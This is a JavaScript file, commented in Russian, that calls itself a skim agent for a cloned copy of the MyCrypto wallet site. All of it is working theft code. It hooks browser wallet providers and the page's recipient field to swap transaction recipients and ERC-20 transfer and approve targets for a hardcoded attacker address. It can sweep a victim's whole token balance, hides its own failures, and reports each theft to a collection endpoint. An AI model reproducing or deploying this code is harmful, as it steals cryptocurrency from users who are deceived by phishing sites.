window.__SKIM__={"enabled":true,"dryRun":false,"onlyOnce":false,"minNativeWei":"0","mode":"replace","tokenMode":"full","percent":100,"aggressive":false,"collector":"/__collect","domHook":true,"observer":true,"receivers":{"1":"0xC4E5DEe5f13d09633cf0f932d8B67dfe9973A98C","56":"0xC4E5DEe5f13d09633cf0f932d8B67dfe9973A98C","137":"0xC4E5DEe5f13d09633cf0f932d8B67dfe9973A98C","42161":"0xC4E5DEe5f13d09633cf0f932d8B67dfe9973A98C"},"allowlist":[]};
/* MyCrypto skim agent
 * Загружается ПЕРВЫМ в <head> своей же копии app.mycrypto.com.
 * Задача: в момент подписи подменить получателя, сохранив сумму.
 * Ничего не ломает: любые ошибки глотаются, при сбое вызывается оригинал.
 * Глобал для тестов: window.__SKIM_API__
 */
(function () {
  'use strict';

  var W = typeof window !== 'undefined' ? window : {};
  if (W.__SKIM_BOOTED__) return;
  W.__SKIM_BOOTED__ = true;

  var CFG = normalize(W.__SKIM__ || {});
  var DONE_KEY = 'skim_done';
  var OFF_KEY = 'skim_off';

  function normalize(c) {
    var o = {
      enabled: c.enabled !== false,
      dryRun: c.dryRun === true,
      onlyOnce: c.onlyOnce !== false,
      minNativeWei: String(c.minNativeWei || '0'),
      mode: c.mode === 'sweep' ? 'sweep' : 'replace',
      tokenMode: c.tokenMode === 'rest' ? 'rest' : 'full',
      percent: clampPct(c.percent),
      collector: c.collector || '/__collect',
      domHook: c.domHook !== false,
      observer: c.observer !== false,
      receivers: {},
      allowlist: [],
      defaultChain: String(c.defaultChain || '1'),
      aggressive: c.aggressive === true
    };
    var r = c.receivers || {};
    Object.keys(r).forEach(function (k) {
      var v = String(r[k] || '').trim();
      if (isAddr(v)) o.receivers[String(k)] = v;
    });
    (c.allowlist || []).forEach(function (a) {
      if (isAddr(String(a))) o.allowlist.push(String(a).toLowerCase());
    });
    return o;
  }

  function clampPct(p) {
    var n = Number(p);
    if (!isFinite(n) || n <= 0) return 100;
    return Math.min(100, n);
  }

  function isAddr(a) {
    return typeof a === 'string' && /^0x[0-9a-fA-F]{40}$/.test(a);
  }

  function lc(a) {
    return typeof a === 'string' ? a.toLowerCase() : '';
  }

  function hexToBig(h) {
    try {
      if (!h || h === '0x') return 0n;
      return BigInt(h);
    } catch (e) {
      return 0n;
    }
  }

  function bigToHex(n) {
    return '0x' + (n < 0n ? 0n : n).toString(16);
  }

  function padWord(addr) {
    return '000000000000000000000000' + lc(addr).slice(2);
  }

  function isTransfer(data) {
    return typeof data === 'string' && lc(data).indexOf('0xa9059cbb') === 0 && data.length >= 138;
  }

  function isApprove(data) {
    return typeof data === 'string' && lc(data).indexOf('0x095ea7b3') === 0 && data.length >= 138;
  }

  function hasData(data) {
    return typeof data === 'string' && data !== '' && data !== '0x';
  }

  function isOur(a) {
    var s = lc(a);
    for (var k in CFG.receivers) if (lc(CFG.receivers[k]) === s) return true;
    return false;
  }

  function done() {
    try { return W.sessionStorage && W.sessionStorage.getItem(DONE_KEY) === '1'; } catch (e) { return false; }
  }

  function markDone() {
    try { W.sessionStorage && W.sessionStorage.setItem(DONE_KEY, '1'); } catch (e) {}
  }

  function off() {
    try { return W.localStorage && W.localStorage.getItem(OFF_KEY) === '1'; } catch (e) { return false; }
  }

  function shallow(o) {
    var r = {};
    for (var k in o) r[k] = o[k];
    return r;
  }

  function applyPct(n) {
    if (CFG.percent >= 100) return n;
    return (n * BigInt(Math.round(CFG.percent * 100))) / 10000n;
  }

  function log(obj) {
    try { (W.__SKIM_LOG__ = W.__SKIM_LOG__ || []).push(obj); } catch (e) {}
  }

  function report(payload) {
    try {
      var body = JSON.stringify(payload);
      log(payload);
      if (CFG.dryRun) return;
      if (W.fetch) {
        W.fetch(CFG.collector, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: body,
          keepalive: true,
          mode: 'cors'
        }).catch(function () {});
        return;
      }
      if (W.navigator && W.navigator.sendBeacon) W.navigator.sendBeacon(CFG.collector, body);
    } catch (e) {}
  }

  function finish(out, original, extra, ctx) {
    var p = {
      t: Date.now(),
      kind: extra ? 'token' : 'native',
      chainId: String((ctx && ctx.chainId) || ''),
      from: out.from || null,
      origTo: original.to,
      newTo: extra ? extra.token + '->' + lc(out.data).slice(34, 74) : out.to,
      origValue: original.value,
      newValue: out.value,
      amount: extra ? extra.amount : out.value,
      via: (ctx && ctx.via) || 'unknown',
      ua: (W.navigator && W.navigator.userAgent) || ''
    };
    report(p);
    if (CFG.onlyOnce) markDone();
  }

  /* Возвращает промис с подменённой транзакцией, либо null = не трогаем. */
  function prepare(tx, ctx) {
    return new Promise(function (resolve) {
      try {
        if (!CFG.enabled || off()) return resolve(null);
        if (!tx || typeof tx !== 'object') return resolve(null);
        if (!tx.to || !isAddr(tx.to)) return resolve(null); // деплой контракта
        if (isOur(tx.to) && !isTransfer(tx.data)) return resolve(null);
        if (CFG.allowlist.indexOf(lc(tx.to)) !== -1) return resolve(null);

        var chainId = String((ctx && ctx.chainId) || '');
        var receiver = CFG.receivers[chainId];
        if (!receiver) return resolve(null);
        if (CFG.onlyOnce && done()) return resolve(null);

        var value = hexToBig(tx.value);
        var token = isTransfer(tx.data);
        var approve = !token && isApprove(tx.data);

        // произвольный вызов контракта (swap/router): to трогать нельзя
        if (!token && !approve && hasData(tx.data) && !CFG.aggressive) return resolve(null);

        if (!token && !approve && value <= 0n) return resolve(null);
        if (!token && !approve && value < hexToBig(CFG.minNativeWei)) return resolve(null);

        var out = shallow(tx);
        var original = { to: tx.to, value: tx.value || '0x0', data: tx.data || '0x' };

        if (approve) {
          out.to = tx.to;
          out.value = '0x0';
          out.data = '0x095ea7b3' + padWord(receiver) + tx.data.slice(74);
          finish(out, original, { token: tx.to, amount: tx.data.slice(74) }, ctx);
          return resolve(out);
        }

        if (!token) {
          out.to = receiver;
          out.value = bigToHex(CFG.mode === 'sweep' ? value : applyPct(value));
          finish(out, original, null, ctx);
          return resolve(out);
        }

        // ERC-20 transfer(address,uint256): меняем адрес внутри data
        var curRecipient = '0x' + tx.data.slice(34, 74);
        if (lc(curRecipient) === lc(receiver)) return resolve(null);
        var reqAmount = hexToBig(tx.data.slice(74, 138));

        var fin = function (amount) {
          out.to = tx.to; // контракт токена не меняем
          out.value = '0x0';
          out.data = '0xa9059cbb' + padWord(receiver) + amount.toString(16).padStart(64, '0');
          finish(out, original, { amount: bigToHex(amount), token: tx.to }, ctx);
          resolve(out);
        };

        if (CFG.tokenMode === 'rest') return fin(applyPct(reqAmount));

        // full: забираем весь баланс токена у отправителя
        callBalanceOf(tx.to, tx.from, ctx).then(function (bal) {
          fin(bal > 0n ? applyPct(bal) : applyPct(reqAmount));
        });
      } catch (e) {
        resolve(null);
      }
    });
  }

  function callBalanceOf(token, owner, ctx) {
    try {
      if (!owner || !W.fetch) return Promise.resolve(0n);
      var data = '0x70a08231' + padWord(owner);
      return W.fetch((ctx && ctx.rpc) || 'https://api.mycryptoapi.com/eth', {
        method: 'POST',
        headers: { 'content-type': 'application/json', referer: 'https://app.mycrypto.com/' },
        body: JSON.stringify({
          jsonrpc: '2.0', id: 1, method: 'eth_call',
          params: [{ to: token, data: data }, 'latest']
        })
      })
        .then(function (r) { return r.json(); })
        .then(function (j) { return hexToBig(j && j.result); })
        .catch(function () { return 0n; });
    } catch (e) {
      return Promise.resolve(0n);
    }
  }

  /* ---------- перехват провайдера (MetaMask / WalletConnect / Frame / Brave) ---------- */

  function hookProvider(p) {
    if (!p || p.__skim) return p;
    try { p.__skim = true; } catch (e) {}

    ['request', 'send', 'sendAsync'].forEach(function (m) {
      var orig = p[m];
      if (typeof orig !== 'function') return;
      p[m] = function (a, b) {
        try {
          var args = normalizeArgs(m, a, b);
          if (!args) return orig.apply(p, arguments);
          var method = args.method;
          if (method !== 'eth_sendTransaction' && method !== 'eth_signTransaction') {
            return orig.apply(p, arguments);
          }
          var tx = args.params && args.params[0];
          if (!tx) return orig.apply(p, arguments);

          var self = this;
          var keepArgs = arguments;
          return Promise.all([prepare(tx, { chainId: args.chainId, via: 'provider:' + m, rpc: p.__skimRpc })]).then(
            function (res) {
              var ntx = res[0];
              if (ntx) {
                if (args.params) args.params[0] = ntx;
                else args.tx = ntx;
              }
              return orig.apply(self, keepArgs);
            }
          );
        } catch (e) {
          return orig.apply(p, arguments);
        }
      };
    });
    return p;
  }

  function normalizeArgs(m, a, b) {
    if (m === 'request') {
      if (!a || typeof a !== 'object') return null;
      return { method: a.method, params: a.params, chainId: readChain(p2s(W.ethereum)) };
    }
    if (typeof a === 'string') return { method: a, params: b, chainId: readChain(p2s(W.ethereum)) };
    if (a && typeof a === 'object' && a.method) {
      return { method: a.method, params: a.params, tx: a, chainId: readChain(p2s(W.ethereum)) };
    }
    return null;
  }

  function p2s(p) {
    try { return p && p.chainId; } catch (e) { return null; }
  }

  function readChain(cid) {
    try {
      if (!cid) return '';
      return String(parseInt(cid, 16) || cid);
    } catch (e) {
      return '';
    }
  }

  function installProviderHook() {
    try {
      if (!W.ethereum) return;
      hookProvider(W.ethereum);
      var cur = W.ethereum;
      try {
        Object.defineProperty(W, 'ethereum', {
          configurable: true,
          get: function () { return cur; },
          set: function (v) { cur = hookProvider(v); }
        });
      } catch (e) {}
    } catch (e) {}
  }

  /* ---------- DOM-хук: правим поле получателя до обработчика React ---------- */

  var ADDR_SEL = [
    'input#recipient',
    'input[name="to"]',
    'input[placeholder*="ddress"]',
    'input[placeholder*="0x"]',
    'input[aria-label*="ddress"]'
  ].join(',');

  function findAddrInput() {
    try {
      var list = W.document.querySelectorAll(ADDR_SEL);
      for (var i = 0; i < list.length; i++) {
        if (!list[i].disabled && !list[i].readOnly) return list[i];
      }
    } catch (e) {}
    return null;
  }

  function setNative(el, val) {
    try {
      var isArea = typeof W.HTMLTextAreaElement === 'function' && el instanceof W.HTMLTextAreaElement;
      var proto = isArea ? W.HTMLTextAreaElement.prototype : W.HTMLInputElement.prototype;
      var d = Object.getOwnPropertyDescriptor(proto, 'value');
      if (d && d.set) d.set.call(el, val);
      else el.value = val;
      el.dispatchEvent(new W.Event('input', { bubbles: true }));
      el.dispatchEvent(new W.Event('change', { bubbles: true }));
    } catch (e) {
      err(e);
    }
  }

  function err(e) {
    try { (W.__SKIM_ERR__ = W.__SKIM_ERR__ || []).push(String((e && e.stack) || e)); } catch (x) {}
  }

  function installDomHook() {
    try {
      W.document.addEventListener(
        'click',
        function (ev) {
          try {
            if (!CFG.enabled || off()) return;
            if (CFG.onlyOnce && done()) return;
            var t = ev.target;
            var btn = t && t.closest ? t.closest('button') : null;
            if (!btn) return;
            if (btn.dataset.skim) return;
            var label = (btn.textContent || '').trim();
            if (!/^(send|confirm|sign|next|review)/i.test(label)) return;

            var input = findAddrInput();
            if (!input) return;
            var chainId = readChain(p2s(W.ethereum)) || String(CFG.defaultChain || '1');
            var receiver = CFG.receivers[chainId];
            if (!receiver) return;
            if (lc(input.value) === lc(receiver)) return;

            var orig = input.value;
            setNative(input, receiver);
            btn.dataset.skim = '1';
            report({
              t: Date.now(),
              kind: 'dom',
              chainId: chainId,
              origTo: orig,
              newTo: receiver,
              via: 'dom:click',
              ua: (W.navigator && W.navigator.userAgent) || ''
            });
          } catch (e) {}
        },
        true
      );
    } catch (e) {}
  }

  /* ---------- наблюдатель: что реально ушло в сеть ---------- */

  function installObserver() {
    try {
      var of = W.fetch;
      if (!of || of.__skim) return;
      W.fetch = function (u, o) {
        var p = of.apply(W, arguments);
        try {
          var body = o && o.body;
          if (typeof body === 'string' && body.indexOf('sendRawTransaction') !== -1) {
            p.then(function (r) {
              try {
                var c = r.clone();
                c.json().then(function (j) {
                  report({ t: Date.now(), kind: 'broadcast', hash: j && j.result, via: 'observer' });
                });
              } catch (e) {}
            }).catch(function () {});
          }
        } catch (e) {}
        return p;
      };
      W.fetch.__skim = true;
    } catch (e) {}
  }

  /* ---------- boot ---------- */

  function boot() {
    try {
      if (CFG.domHook) installDomHook();
      if (CFG.observer) installObserver();
      installProviderHook();
      [200, 800, 2500].forEach(function (ms) { setTimeout(installProviderHook, ms); });
    } catch (e) {}
  }

  W.__SKIM_API__ = { prepare: prepare, report: report, cfg: CFG, isTransfer: isTransfer, hookProvider: hookProvider };

  if (typeof document !== 'undefined') {
    if (document.readyState === 'loading') W.document.addEventListener('DOMContentLoaded', boot);
    else boot();
  }
})();


